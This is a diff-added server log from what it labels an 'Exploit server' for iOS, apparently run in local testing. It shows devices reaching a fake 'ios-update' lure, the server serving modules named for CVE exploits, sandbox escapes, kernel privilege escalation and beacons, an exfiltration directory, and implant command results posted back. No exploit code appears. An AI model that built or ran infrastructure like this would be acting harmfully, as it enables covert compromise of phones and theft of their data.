+[2026-09-10 18:23:29] GET /e/index.html from 127.0.0.1 (device: ios-eb5ec2ec730b3944a2e08dafade991c3)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/index.html from 127.0.0.1 (device: ios-d59f73cab673b8cac2aa23026eb399b8)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] GET /e/index.html from 127.0.0.1 (device: ios-7b7e9d8529171b925c3985ca4313838c)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-4d4d94e702273d4b39c7fb017cbe5ba7)
+[2026-09-10 18:23:29] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/index.html from 127.0.0.1 (device: ios-4adb2323d42315755cc8d13278254207)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/index.html from 127.0.0.1 (device: ios-5f1f65890c1514e349e915326c9657c3)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] GET /e/index.html from 127.0.0.1 (device: ios-6ea771b1838f6d8fcd61b3252e5a026a)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-fa315af5e4cc037f9c74413dbd377b2c)
+[2026-09-10 18:23:29] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/group.html from 127.0.0.1 (device: ios-e88c30ae649414a63d0730ed190f9b0c)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] [REQUEST] "GET /group.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/group.html from 127.0.0.1 (device: ios-f7d919eaffcb5069d0de61756f0f797d)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-e979f64512c8c01ed184bdeeba135063)
+[2026-09-10 18:23:29] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/group.html from 127.0.0.1 (device: ios-f02b82668c5ff17f24449b77bf787152)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] [REQUEST] "GET /group.html HTTP/1.1" 200 -
+[2026-09-10 18:23:29] [REQUEST] "GET /e/index.html HTTP/1.1" 302 -
+[2026-09-10 18:23:29] GET /e/group.html from 127.0.0.1 (device: ios-10c4afc6e7987e34e28b698186a3c5cd)
+[2026-09-10 18:23:29] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 19:41:50] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 19:41:50] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 19:41:50] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 19:41:50] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 19:42:11] GET /e/native_bridge.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/native_bridge.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/plugin_loader.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/plugin_loader.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/fallback_executor.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/fallback_executor.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/exploit_registry.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/exploit_registry.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/metric_collector.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/metric_collector.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/ghostknife.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/ghostknife.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/coreaudio_trigger_CVE-2025-31200.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/coreaudio_trigger_CVE-2025-31200.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/angle_webgl_CVE-2025-14174.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/angle_webgl_CVE-2025-14174.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/kernel_priv_CVE-2025-43520.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/kernel_priv_CVE-2025-43520.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/webkit_uaf_CVE-2025-43529.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/webkit_uaf_CVE-2025-43529.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/webkit_sbx_CVE-2025-24201.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/webkit_sbx_CVE-2025-24201.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/bcmwlan_priv_escalation.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/bcmwlan_priv_escalation.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/sbx0_main_18.4.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/sbx0_main_18.4.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/sbx1_main.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/sbx1_main.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/attack_chain_orchestrator.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/attack_chain_orchestrator.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/rce_worker_18.6.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/rce_worker_18.6.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/rce_module_18.6.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/rce_module_18.6.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/module_integrity.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/module_integrity.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/beacon.build.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/beacon.build.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/beacon_complete_integration.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/beacon_complete_integration.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/beacon_commands_extended.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/beacon_commands_extended.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/exploit_selector.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/exploit_selector.js HTTP/1.1" 404 -
+[2026-09-10 19:42:11] GET /e/sbx0_main_26.js from 127.0.0.1
+[2026-09-10 19:42:11] [REQUEST] code 404, message Not Found
+[2026-09-10 19:42:11] [REQUEST] "GET /e/sbx0_main_26.js HTTP/1.1" 404 -
+[2026-09-10 19:43:05] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 19:43:05] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 19:43:05] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 19:43:05] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 19:43:26] [REQUEST] "GET /e/native_bridge.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/plugin_loader.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/fallback_executor.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/exploit_registry.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/metric_collector.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/ghostknife.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/coreaudio_trigger_CVE-2025-31200.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/angle_webgl_CVE-2025-14174.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/kernel_priv_CVE-2025-43520.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/webkit_uaf_CVE-2025-43529.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/webkit_sbx_CVE-2025-24201.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/bcmwlan_priv_escalation.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/sbx0_main_18.4.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/sbx1_main.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/attack_chain_orchestrator.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/rce_worker_18.6.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/rce_module_18.6.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/module_integrity.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/beacon.build.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/beacon_complete_integration.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/beacon_commands_extended.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/exploit_selector.js HTTP/1.1" 200 -
+[2026-09-10 19:43:26] [REQUEST] "GET /e/sbx0_main_26.js HTTP/1.1" 200 -
+[2026-09-10 19:44:14] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 19:44:14] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 19:44:14] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 19:44:14] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 19:44:36] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-30f4cdd7141f41f703351cc4e9e079b6)
+[2026-09-10 19:44:36] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 19:44:36] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 19:44:36] GET /e/index.html from 127.0.0.1 (device: ios-b408d1e3b8e2af7a9a4f53275b4cc16d)
+[2026-09-10 19:44:36] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 19:44:36] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-4d3ad3f6a6ec716845923c176302000e)
+[2026-09-10 19:44:36] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 19:44:36] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 19:44:36] GET /e/index.html from 127.0.0.1 (device: ios-9fb062c48bbccf53449c3833e987ca7a)
+[2026-09-10 19:44:36] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 19:44:36] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-90a571dee438db9f87627d3d3f37e255)
+[2026-09-10 19:44:36] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 19:44:36] [REQUEST] "GET /group.html HTTP/1.1" 200 -
+[2026-09-10 19:44:36] [REQUEST] "GET /e/index.html HTTP/1.1" 302 -
+[2026-09-10 19:44:36] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-781573816d2ce3736f1e3981ae28c632)
+[2026-09-10 19:44:36] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 19:44:36] [REQUEST] "GET /group.html HTTP/1.1" 200 -
+[2026-09-10 19:44:36] [REQUEST] "GET /e/index.html HTTP/1.1" 302 -
+[2026-09-10 19:44:36] GET /e/group.html from 127.0.0.1 (device: ios-677477cd62e1e839fce146dfd873fa6d)
+[2026-09-10 19:44:36] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 20:00:19] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 20:00:19] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 20:00:19] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 20:00:19] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 20:00:40] GET /e/group.html from 127.0.0.1 (device: ios-f859da6a399311a94a1d2b677f977fbe)
+[2026-09-10 20:00:40] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 23:55:55] Exploit server started on http://0.0.0.0:17071 | DB=True
+[2026-09-10 23:55:55] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 23:55:55] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 23:55:55] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 23:55:56] POST /cmd_result from 127.0.0.1 (88 bytes)
+[2026-09-10 23:55:56] [CMD-NOT-FOUND] cmd_id=5 status=completed — command not in DB (deleted or invalid id)
+[2026-09-10 23:55:56] [CMD-RESULT-RECEIVED] id=5 status=completed out_len=21 preview=test v20 POST json OK
+[2026-09-10 23:55:56] [REQUEST] "POST /cmd_result HTTP/1.1" 200 -
+[2026-09-10 23:55:56] GET /cmd_result?id=5&status=completed&device_uuid=ios-v20-2&output=test%20v20%20GET%20query%20fallback%20OK from 127.0.0.1 (device: dev-cf25f1c6a61df1cdc4b54f8f)
+[2026-09-10 23:55:56] [CMD-NOT-FOUND] cmd_id=5 status=completed — command not in DB (deleted or invalid id)
+[2026-09-10 23:55:56] [CMD-RESULT-GET-FALLBACK] id=5 status=completed out_len=30
+[2026-09-10 23:55:56] [REQUEST] "GET /cmd_result?id=5&status=completed&device_uuid=ios-v20-2&output=test%20v20%20GET%20query%20fallback%20OK HTTP/1.1" 200 -
+[2026-09-11 00:05:36] Exploit server started on http://0.0.0.0:17072 | DB=True
+[2026-09-11 00:05:36] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-11 00:05:36] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-11 00:05:36] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-11 00:05:37] GET /e/1 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/1 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/2 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/2 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/3 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/3 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/4 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/4 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/5 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/5 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/6 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/6 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/7 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/7 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/8 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/8 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/9 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/9 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/10 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/10 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/11 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/11 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/12 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/12 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/13 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/13 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/14 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/14 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/15 from 127.0.0.1
+[2026-09-11 00:05:37] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:37] [REQUEST] "GET /e/15 HTTP/1.1" 404 -
+[2026-09-11 00:05:37] GET /e/16 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/16 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/17 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/17 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/18 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/18 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/19 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/19 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/20 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/20 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/21 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/21 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/22 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/22 HTTP/1.1" 404 -
+[2026-09-11 00:05:38] GET /e/23 from 127.0.0.1
+[2026-09-11 00:05:38] [REQUEST] code 404, message Not Found
+[2026-09-11 00:05:38] [REQUEST] "GET /e/23 HTTP/1.1" 404 -
+[2026-09-11 00:06:35] Exploit server started on http://0.0.0.0:17073 | DB=True
+[2026-09-11 00:06:35] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-11 00:06:35] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-11 00:06:35] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-11 00:06:37] GET /e/1 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/1 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/2 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/2 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/3 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/3 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/4 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/4 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/5 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/5 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/6 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/6 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/7 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/7 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/8 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/8 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/9 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/9 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/10 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/10 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/11 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/11 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/12 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/12 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/13 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/13 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/14 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/14 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/15 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/15 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/16 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/16 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/17 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/17 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/18 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/18 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/19 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/19 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/20 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/20 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/21 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/21 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/22 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/22 HTTP/1.1" 200 -
+[2026-09-11 00:06:37] GET /e/23 from 127.0.0.1
+[2026-09-11 00:06:37] [REQUEST] "GET /e/23 HTTP/1.1" 200 -
+[2026-09-11 00:20:13] Exploit server started on http://0.0.0.0:17074 | DB=True
+[2026-09-11 00:20:13] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-11 00:20:13] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-11 00:20:13] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-11 00:20:15] POST /cmd_result from 127.0.0.1 (77 bytes)
+[2026-09-11 00:20:15] [CMD-RESULT-PARSE-ERROR] device=None ip=127.0.0.1 body_len=77 -> Expecting property name enclosed in double quotes: line 1 column 2 (char 1) raw=b'{id:999,output:v20.2 POST json OK,status:completed,device_uuid:ios-v202-post}'
+[2026-09-11 00:20:15] [REQUEST] "POST /cmd_result HTTP/1.1" 200 -
+[2026-09-11 00:20:15] GET /cmd_result?id=999&status=failed&device_uuid=ios-v202-get&output=v20.2%20GET%20query%20OK from 127.0.0.1 (device: dev-d7640d1e7c924cf8682a9bff)
+[2026-09-11 00:20:15] [CMD-RESULT] cmd_id=999 device=ios-v202 cmd=ds_info -> status=failed out_len=18 dur=28802.7s preview=v20.2 GET query OK
+[2026-09-11 00:20:15] [CMD-RESULT-GET-FALLBACK] id=999 status=failed out_len=18 device=ios-v202-get
+[2026-09-11 00:20:15] [REQUEST] "GET /cmd_result?id=999&status=failed&device_uuid=ios-v202-get&output=v20.2%20GET%20query%20OK HTTP/1.1" 200 -
